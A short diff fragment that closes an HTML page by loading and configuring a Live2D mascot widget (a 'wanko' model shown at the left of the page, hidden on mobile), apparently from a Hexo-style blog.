+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":250,"height":500},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
